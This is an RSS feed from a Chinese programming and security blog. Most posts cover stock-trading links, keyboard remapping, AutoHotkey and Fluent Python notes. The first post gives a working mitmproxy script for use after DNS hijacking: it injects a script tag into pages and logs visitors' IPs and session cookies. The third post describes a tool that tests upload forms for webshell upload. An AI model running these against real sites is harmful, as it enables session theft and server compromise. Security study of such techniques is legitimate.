<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Thu, 07 Jun 2018 08:38:50 -0400</pubDate>
    <lastBuildDate>Thu, 07 Jun 2018 08:38:50 -0400</lastBuildDate>
    <generator>Jekyll v3.7.3</generator>
    
      <item>
        <title>域名劫持后利用脚本</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;p&gt;本文记录一种在域名劫持后通过mitmproxy进行http会话劫持的利用脚本,该脚本通过mitmdump的反向代理工作模式进行流量劫持.&lt;/p&gt;

&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;

&lt;p&gt;1.通过修改域名的A记录来进行域名劫持&lt;/p&gt;

&lt;p&gt;2.在域名的新A记录主机上安装mitmproxy:&lt;code class=&quot;highlighter-rouge&quot;&gt;pip3 install mitmproxy&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;3.在域名的新A记录主机上运行:
    &lt;code class=&quot;highlighter-rouge&quot;&gt;mitmdump --set allow_remote=true -—listen-host 0.0.0.0 -s xdomain.py --mode reverse:http://xxx.xxx.xxx:80 -p 80&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--listen-host代表本地监听ip
--mode reverse代表以反向代理的模式进行工作
--set allow_remote=true代表支持客户端访问的时候是通过代理访问的
运行时需要需要上面命令中的http://xxx.xxx.xxx:80为目标网站地址,且修改下面代码中的http://xxx.xxx.xxx为目标网站地址
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import os
import re
import chardet


def request(flow):
    # url=flow.request.url
    # flow.request.headers['User-Agent']='xxx'
    pass


def response(flow):
    url = flow.request.url
    print(url)
    if &quot;http://xxx.xxx.xxx&quot; in url:
        content = flow.response.content
        cookie = flow.request.headers['Cookie']
        ip = str(flow.client_conn.ip_address).split(&quot;:&quot;)[0]
        bytes_encoding = chardet.detect(content)['encoding']
        origin_html = content.decode(encoding=bytes_encoding, errors=&quot;ignore&quot;)
        if &quot;&amp;lt;/html&amp;gt;&quot; in origin_html:
            insert_xss = '''&amp;lt;script&amp;gt;alert(&quot;you're hacked&quot;)&amp;lt;/script&amp;gt;&amp;lt;/html&amp;gt;'''
            new_html = origin_html.replace(&quot;&amp;lt;/html&amp;gt;&quot;, insert_xss)
            flow.response.text = new_html
        return_value = {'ip': ip, 'url': url, 'cookie': cookie}
        with open(&quot;mitm.log&quot;, &quot;a+&quot;) as f:
            f.write(str(return_value) + &quot;\n&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/3xp10it/mytools/master/xdomain.py&quot;&gt;download&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Tue, 29 May 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/web/2018/05/29/%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%E5%90%8E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2018/05/29/%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%E5%90%8E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/</guid>
        
        <category>mitmproxy</category>
        
        <category>mitmdump</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>炒股</title>
        <description>&lt;h3 id=&quot;k线&quot;&gt;k线&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ricequant.com/community/topic/2393/&quot;&gt;talib-K线模式识别&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32470289&quot;&gt;关于蜡烛图,看完这一篇文章就够了&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;指标&quot;&gt;指标&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://stock.quote.stockstar.com/tech_601318.shtml&quot;&gt;快速指标分析&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://m.stock.pingan.com/omm/mobile/zixun/m.html?id=1000052297&amp;amp;t=22493765&amp;amp;unionId=a696c392e1444ee7a9ba8a5d95d84414&quot;&gt;ene指标应用&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.gupang.com/201606/39839.html&quot;&gt;kdj指标应用&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.360doc.com/content/16/0204/09/11492064_532629892.shtml&quot;&gt;macd指标应用&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.yingjia360.com/rsi/2016-07-08/30905.html&quot;&gt;rsi指标应用&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;交易量应用
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://zhidao.baidu.com/question/30738506.html&quot;&gt;1&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;http://guba.eastmoney.com/news,gssz,720380626.html&quot;&gt;2&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://wenku.baidu.com/view/14b3b8be7f1922791788e815.html&quot;&gt;3&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;买卖点&quot;&gt;买卖点&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://wenku.baidu.com/view/75724ae05ff7ba0d4a7302768e9951e79b8969a1.html&quot;&gt;格兰维尔八大买卖法则&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://baijiahao.baidu.com/s?id=1561500866945671&amp;amp;wfr=spider&amp;amp;for=pc&quot;&gt;红三兵买入&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.360doc.com/content/15/1027/16/7180626_508769390.shtml&quot;&gt;江恩买卖十二法则&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Tue, 01 May 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/%E7%82%92%E8%82%A1/2018/05/01/%E7%82%92%E8%82%A1/</link>
        <guid isPermaLink="true">http://localhost:4000/%E7%82%92%E8%82%A1/2018/05/01/%E7%82%92%E8%82%A1/</guid>
        
        <category>炒股</category>
        
        
        <category>炒股</category>
        
      </item>
    
      <item>
        <title>自动测试上传功能是否可上传webshell</title>
        <description>&lt;h2 id=&quot;about&quot;&gt;About&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/3xp10it/xupload&quot;&gt;xupload&lt;/a&gt;是一个用于自动测试上传功能是否可上传webshell的工具&lt;/p&gt;

&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;

&lt;p&gt;[!] legal disclaimer: Usage of xupload.py for attacking targets without prior mutual consent is illegal.It is the end user’s responsibility to obey all applicable local, state and federal laws.Developers assume no liability and are not responsible for any misuse or damage caused by this program.&lt;/p&gt;

&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 xupload.py -h

usage: xupload.py [-h] [-u URL] [--cookie COOKIE] --suffix SUFFIX [--batch]
                  [--delay DELAY] [--force-ssl] [-r R]

xupload.py is a program that automates the testing of uploading functionality.
If xupload.py does not successfully upload webshell, try more tips at:
1.http://3xp10it.cc/web/2016/08/12/fckeditor各版本绕过/
2.https://paper.seebug.org/219/
3.http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf
4.https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/

optional arguments:
  -h, --help         show this help message and exit
  -u URL, --url URL  The target url which has upload function
  --cookie COOKIE    HTTP Cookie header value
  --suffix SUFFIX    The web server's script type: 'php','asp','aspx','jsp'
  --batch            Never ask for user input, use the default behavior
  --delay DELAY      Delay in seconds between each HTTP request
  --force-ssl        Force usage of SSL/HTTPS
  -r R               Load HTTP request from a file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;eg.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -u http://192.168.8.190/vulnerabilities/upload/ --cookie &quot;PHPSESSID=v7rebkn2dn8ln1ebuqfhjf00s4;security=low&quot; --batch&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;attention&quot;&gt;Attention&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-r&lt;/code&gt;参数是在xupload.py无法自动识别url对应的html中上传表单时要用到的参数(一般通过插件实现上传功能的url无法通过xupload.py自动获取上传表单),用于指定一个http上传文件时拦截到的请求包,如果url是https开头则需要指定&lt;code class=&quot;highlighter-rouge&quot;&gt;--force-ssl&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://oiqwnrsx4.bkt.clouddn.com/xupload.mov&quot;&gt;视频示例&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 25 Apr 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/web/2018/04/25/%E8%87%AA%E5%8A%A8%E6%B5%8B%E8%AF%95%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%E6%98%AF%E5%90%A6%E5%8F%AF%E4%B8%8A%E4%BC%A0webshell/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2018/04/25/%E8%87%AA%E5%8A%A8%E6%B5%8B%E8%AF%95%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%E6%98%AF%E5%90%A6%E5%8F%AF%E4%B8%8A%E4%BC%A0webshell/</guid>
        
        <category>upload</category>
        
        <category>python</category>
        
        <category>webshell</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>caps键按住时映射为ctrl,按下一次时映射为esc</title>
        <description>&lt;h3 id=&quot;0x1-about&quot;&gt;0x1 About&lt;/h3&gt;

&lt;p&gt;使用vim和使用常用快捷键时这样设置会带来极大的便利:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;caps键按住时映射为ctrl,按下一次时映射为esc&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x2-detail&quot;&gt;0x2 Detail&lt;/h3&gt;

&lt;h4 id=&quot;macos&quot;&gt;macOS&lt;/h4&gt;

&lt;p&gt;参考&lt;a href=&quot;http://3xp10it.cc/linux/2017/03/11/%E5%AE%89%E8%A3%85macOS-sierra%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B/&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;linux&quot;&gt;linux&lt;/h4&gt;

&lt;p&gt;参考&lt;a href=&quot;https://askubuntu.com/questions/177824/remapping-caps-lock-to-control-and-escape-not-the-usual-way/228379&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;1.Under System Preferences &amp;gt; Keyboard Layout &amp;gt; Options… &amp;gt; Ctrl key position, I checked ‘Caps Lock as Ctrl’.
2.&lt;code class=&quot;highlighter-rouge&quot;&gt;xcape -e 'Control_L=Escape'&lt;/code&gt;
或
&lt;code class=&quot;highlighter-rouge&quot;&gt;setxkbmap -option 'caps:ctrl_modifier'  xcape -e 'Caps_Lock=Escape'&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;windows&quot;&gt;windows&lt;/h4&gt;

&lt;p&gt;参考&lt;a href=&quot;http://vim.wikia.com/wiki/Map_caps_lock_to_escape_in_Windows&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 25 Apr 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/vim/2018/04/25/caps%E9%94%AE%E6%8C%89%E4%BD%8F%E6%97%B6%E6%98%A0%E5%B0%84%E4%B8%BActrl,%E6%8C%89%E4%B8%8B%E4%B8%80%E6%AC%A1%E6%97%B6%E6%98%A0%E5%B0%84%E4%B8%BAesc/</link>
        <guid isPermaLink="true">http://localhost:4000/vim/2018/04/25/caps%E9%94%AE%E6%8C%89%E4%BD%8F%E6%97%B6%E6%98%A0%E5%B0%84%E4%B8%BActrl,%E6%8C%89%E4%B8%8B%E4%B8%80%E6%AC%A1%E6%97%B6%E6%98%A0%E5%B0%84%E4%B8%BAesc/</guid>
        
        <category>caps</category>
        
        <category>ctrl</category>
        
        <category>esc</category>
        
        <category>vim</category>
        
        
        <category>vim</category>
        
      </item>
    
      <item>
        <title>港股基础概念</title>
        <description>&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://stock.qq.com/a/20180129/012522.htm&quot;&gt;窝轮与牛熊证&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://finance.sina.com.cn/stock/hkstock/warrants/20090206/15065826186.shtml&quot;&gt;牛熊证回收价与行使价&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Sat, 07 Apr 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/%E7%82%92%E8%82%A1/2018/04/07/%E6%B8%AF%E8%82%A1%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/</link>
        <guid isPermaLink="true">http://localhost:4000/%E7%82%92%E8%82%A1/2018/04/07/%E6%B8%AF%E8%82%A1%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/</guid>
        
        <category>炒股</category>
        
        
        <category>炒股</category>
        
      </item>
    
      <item>
        <title>快速切换至目标应用程序</title>
        <description>&lt;h3 id=&quot;0x0-about&quot;&gt;0x0 About&lt;/h3&gt;

&lt;p&gt;本文介绍macOS和windows下实现快速切换至后台中的目标应用程序的方法&lt;/p&gt;

&lt;h4 id=&quot;0xa-macos&quot;&gt;0xa macOS&lt;/h4&gt;

&lt;p&gt;alfred的workflows功能可实现快速切换至后台中的目标应用程序的方法.在使用macOS时,一般会使用到多个app,如下图&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/alfred_quick_switch_app1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在使用iterm2时想切换至pd的kali机上(图中第6个图标),或者在pd的kali机上想切换到firefox上,或者当前在任意app中想切换到另一个指定的app时直接使用&lt;code class=&quot;highlighter-rouge&quot;&gt;cmd+tab&lt;/code&gt;效率较低,可通过alfred的workflows功能实现&lt;code class=&quot;highlighter-rouge&quot;&gt;一键切换&lt;/code&gt;.&lt;/p&gt;

&lt;h5 id=&quot;detail&quot;&gt;Detail&lt;/h5&gt;

&lt;p&gt;最终实现3个应用程序的快速切换快捷键:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;firefox 对应 &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd+f&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;pd的kali机 对应 &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd+p&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;pd的iterm2 对应 &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd+i&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;alfred完成如下图:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/alfred_quick_switch_app2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;以其中pd的kali机为例,&lt;code class=&quot;highlighter-rouge&quot;&gt;Hotkey&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;Launch App/Files&lt;/code&gt;详情分别如下图:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/alfred_quick_switch_app3.png&quot; alt=&quot;3&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/alfred_quick_switch_app4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;0xb-windows&quot;&gt;0xb windows&lt;/h4&gt;

&lt;p&gt;autohotkey是一个win下的效率神器,可通过autohotkey来实现macOS下的相同功能,本文只涉及&lt;code class=&quot;highlighter-rouge&quot;&gt;firefox|explorer&lt;/code&gt;的快速切换,其他应用程序对应的autohotkey脚本的写法可能不同&lt;/p&gt;

&lt;h5 id=&quot;detail-1&quot;&gt;Detail&lt;/h5&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#f::switchToFirefox()
switchToFirefox(){
sendinput, {SC0E8} ;scan code of an unassigned key. Do I NEED this?
IfWinNotExist, ahk_class MozillaWindowClass
	Run, firefox.exe
if WinActive(&quot;ahk_exe firefox.exe&quot;)
	Send ^{tab}
else
	{
	;WinRestore ahk_exe firefox.exe
	WinActivate ahk_exe firefox.exe
	;sometimes winactivate is not enough. the window is brought to the foreground, but not put into FOCUS.
	;the below code should fix that.
	WinGet, hWnd, ID, ahk_class MozillaWindowClass
	DllCall(&quot;SetForegroundWindow&quot;, UInt, hWnd) 
	}
}

#e::switchToExplorer()
switchToExplorer(){
IfWinNotExist, ahk_class CabinetWClass
	Run, explorer.exe
GroupAdd, taranexplorers, ahk_class CabinetWClass
if WinActive(&quot;ahk_exe explorer.exe&quot;)
	GroupActivate, taranexplorers, r
else
	WinActivate ahk_class CabinetWClass ;you have to use WinActivatebottom if you didn't create a window group.
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ahk脚本代码地址在&lt;a href=&quot;https://github.com/3xp10it/ahk&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Thu, 29 Mar 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/auxilary/2018/03/29/%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2%E8%87%B3%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2018/03/29/%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2%E8%87%B3%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/</guid>
        
        <category>alfred</category>
        
        <category>效率</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>流畅的python第5-7章笔记</title>
        <description>&lt;h2 id=&quot;把函数视作对象&quot;&gt;把函数视作对象&lt;/h2&gt;

&lt;h3 id=&quot;第5章-一等函数&quot;&gt;第5章 一等函数&lt;/h3&gt;

&lt;p&gt;1.在函数式编程范式中,最为人熟知的高阶函数有&lt;code class=&quot;highlighter-rouge&quot;&gt;map&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;filter&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;reduce&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;apply&lt;/code&gt;.函数式语言通常会提供map,filter和reduce三个高阶函数(有时使用不同的名称).在python3中,map和filter还是内置函数,但是由于引入了列表推导和生成器表达式,它们变得没那么重要了.列表推导和生成器表达式具有map和filter两个函数的功能.而且更易于阅读.&lt;/p&gt;

&lt;p&gt;2.&lt;code class=&quot;highlighter-rouge&quot;&gt;sum&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;reduce&lt;/code&gt;函数用于求和.最好使用sum函数,可读性更好.sum和reduce的通用思想是把某个操作连续应用到序列的元素上,累计之前的结果,把一系列值&lt;code class=&quot;highlighter-rouge&quot;&gt;归约&lt;/code&gt;成一个值.&lt;code class=&quot;highlighter-rouge&quot;&gt;all&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;any&lt;/code&gt;也是内置的归约函数&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [2]: from functools import reduce

In [3]: from operator import add

In [4]: reduce(add,range(100))
Out[4]: 4950

In [5]: sum(range(100))
Out[5]: 4950


In [6]: all('niaho')
Out[6]: True

In [7]: all('niaho',['wohao'])
---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-7-663ce7255241&amp;gt; in &amp;lt;module&amp;gt;()
----&amp;gt; 1 all('niaho',['wohao'])

TypeError: all() takes exactly one argument (2 given)

In [8]: all(('niaho',['wohao']))
Out[8]: True

In [9]: all(('niaho',['wohao'],''))
Out[9]: False

In [10]: any('niaho')
Out[10]: True

In [12]: any('niaho',['wohao'])
---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-12-3e515d3dba5a&amp;gt; in &amp;lt;module&amp;gt;()
----&amp;gt; 1 any('niaho',['wohao'])

TypeError: any() takes exactly one argument (2 given)

In [13]: any(('niaho',['wohao'],''))
Out[13]: True
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;3.为了使用高阶函数,有时创建一次性的小型函数更便利.这便是匿名函数存在的原因.lambda关键字在python表达式内创建匿名函数.然而,python简单的句法限制了lambda函数的定义体只能使用纯表达式.换句话说,lambda函数的定义体中不能赋值,也不能使用while和try等python语句.eval函数好像也是这样.除了作为参数传给高阶函数之外,python很少使用匿名函数.由于句法上的限制,非平凡的lambda表达式要么难以阅读,要么无法写出.lambda句法只是语法糖:与def语句一样,lambda表达式会创建函数对象&lt;/p&gt;

&lt;p&gt;4.python数据模型文档列出了7种可调用对象&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;用户定义的函数.使用def或lambda表达式创建&lt;/li&gt;
  &lt;li&gt;内置函数.使用c语言(cpython)实现的函数,如len或time.strftime&lt;/li&gt;
  &lt;li&gt;内置方法.使用c语言实现的方法,如dict.get&lt;/li&gt;
  &lt;li&gt;方法.在类的定义体中定义的函数&lt;/li&gt;
  &lt;li&gt;类.调用类时会运行类的&lt;code class=&quot;highlighter-rouge&quot;&gt;__new__&lt;/code&gt;方法创建一个实例,然后运行__init__方法,初始化实例,最后把实例返回给调用方&lt;/li&gt;
  &lt;li&gt;类的实例.如果类定义了&lt;code class=&quot;highlighter-rouge&quot;&gt;__call__&lt;/code&gt;方法,那么它的实例可以作为函数调用&lt;/li&gt;
  &lt;li&gt;生成器函数.使用&lt;code class=&quot;highlighter-rouge&quot;&gt;yield&lt;/code&gt;关键字的函数或方法.调用生成器函数返回的是生成器对象,生成器函数还可以作为协程&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;5.从定位参数到仅限关键字参数&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [17]: my_tag={'name':'img','title':'Sunset Boulevard','src':'sunset.jpg','cls':'framed'}

In [18]: tag(**my_tag)
name is:img
content is:()
cls is:framed
attrs is:{'title': 'Sunset Boulevard', 'src': 'sunset.jpg'}

In [19]: def tag(name,*content,cls=None,**attrs):
    ...:     print(&quot;name is:&quot;+name)
    ...:     print(&quot;content is:&quot;+str(content))
    ...:     print(&quot;cls is:&quot;+str(cls))
    ...:     print(&quot;attrs is:&quot;+str(attrs))
    ...:
    ...:

In [20]: tag('p','hello')
name is:p
content is:('hello',)
cls is:None
attrs is:{}

In [21]: my_tag={'name':'img','title':'Sunset Boulevard','src':'sunset.jpg','cls':'framed'}

In [22]: tag(**my_tag)
name is:img
content is:()
cls is:framed
attrs is:{'title': 'Sunset Boulevard', 'src': 'sunset.jpg'}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;调用&lt;code class=&quot;highlighter-rouge&quot;&gt;tag('p','hello')&lt;/code&gt;时,第一个参数后面的任意个参数会被&lt;code class=&quot;highlighter-rouge&quot;&gt;*content&lt;/code&gt;捕获,存入一个元组
调用&lt;code class=&quot;highlighter-rouge&quot;&gt;tag(**my_tag)&lt;/code&gt;时,在my_tag前面加上&lt;code class=&quot;highlighter-rouge&quot;&gt;**&lt;/code&gt;,字典中的所有元素作为单个参数传入,同名键会绑定到对应的具名参数上,余下的则被&lt;code class=&quot;highlighter-rouge&quot;&gt;**attrs&lt;/code&gt;捕获&lt;/p&gt;

&lt;p&gt;6.函数对象有个&lt;code class=&quot;highlighter-rouge&quot;&gt;__defaults__&lt;/code&gt;属性,它的值是一个元组,里面保存着定位参数和关键字参数的默认值.仅限关键字参数的默认值在&lt;code class=&quot;highlighter-rouge&quot;&gt;__kwdefaults__&lt;/code&gt;属性中.然而,参数的名称在&lt;code class=&quot;highlighter-rouge&quot;&gt;__code__&lt;/code&gt;属性中,它的值是一个code对象引用,自身也有很多属性如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [31]: def tag(name,*content,cls=666,**attrs):
    ...:     print(&quot;name is:&quot;+name)

In [32]: tag.__defaults__

In [33]: tag.__kwdefaults__
Out[33]: {'cls': 666}

In [34]: tag.__code__
Out[34]: &amp;lt;code object tag at 0x102288540, file &quot;&amp;lt;ipython-input-31-7396c504e34a&amp;gt;&quot;, line 1&amp;gt;

In [35]: tag.__code__.co_name
Out[35]: 'tag'

In [36]: tag.__code__.co_names
Out[36]: ('print',)

In [37]: tag.__code__.co_varnames
Out[37]: ('name', 'cls', 'content', 'attrs')

In [38]: tag.__code__.co_argcount
Out[38]: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;第6章-使用一等函数实现设计模式&quot;&gt;第6章 使用一等函数实现设计模式&lt;/h3&gt;

&lt;p&gt;1.&lt;/p&gt;

&lt;h3 id=&quot;第7章-函数装饰器和闭包&quot;&gt;第7章 函数装饰器和闭包&lt;/h3&gt;

&lt;p&gt;1.&lt;/p&gt;
</description>
        <pubDate>Thu, 01 Mar 2018 00:00:00 -0500</pubDate>
        <link>http://3xp10it.cc/python/2018/03/01/%E6%B5%81%E7%95%85%E7%9A%84python%E7%AC%AC5-7%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/python/2018/03/01/%E6%B5%81%E7%95%85%E7%9A%84python%E7%AC%AC5-7%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>流畅的python第4章笔记</title>
        <description>&lt;h3 id=&quot;文本和字节序列&quot;&gt;文本和字节序列&lt;/h3&gt;

&lt;p&gt;1.unicode与utf-8的&lt;a href=&quot;http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html&quot;&gt;关系&lt;/a&gt;
UTF-8就是在互联网上使用最广的一种unicode的实现方式(80%的网站已经使用UTF8),这是为传输而设计的编码,并使编码无国界,这样就可以显示全世界上所有文化的字符了.UTF-8最大的一个特点,就是它是一种变长的编码方式.它可以使用1~4个字节表示一个符号,根据不同的符号而变化字节长度,当字符在ASCII码的范围时,就用一个字节表示,保留了ASCII字符一个字节的编码做为它的一部分,注意的是unicode一个中文字符占2个字节,而UTF-8一个中文字符占3个字节)&lt;/p&gt;

&lt;p&gt;2.struct模块提供了一些函数,把字节序列转换成不同类型字段组成的元组(&lt;code class=&quot;highlighter-rouge&quot;&gt;struct.unpack&lt;/code&gt;),还有一些函数用于执行反向转换,把元组转换成字节序列(&lt;code class=&quot;highlighter-rouge&quot;&gt;struct.pack&lt;/code&gt;).struct模块能处理bytes,bytearray和memoryview对象&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [62]: struct.unpack('ii',b'\x0c\x00\x00\x00\r\x00\x00\x00')
Out[62]: (12, 13)

In [63]: struct.pack('ii',12,13)
Out[63]: b'\x0c\x00\x00\x00\r\x00\x00\x00'


In [70]: import struct

In [71]: with open('/Users/3xp10it/Downloads/1.gif','rb') as fp:
    ...:     img=memoryview(fp.read())

In [72]: img
Out[72]: &amp;lt;memory at 0x109972e88&amp;gt;

In [73]: header=img[:10]

In [74]: header
Out[74]: &amp;lt;memory at 0x109c13048&amp;gt;

In [75]: bytes(header)
Out[75]: b'GIF89a\x90\x01\x90\x01'

In [76]: fmt='&amp;lt;3s3sHH'

In [77]: struct.unpack(fmt,header)
Out[77]: (b'GIF', b'89a', 400, 400)

In [78]: del header

In [79]: del img
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

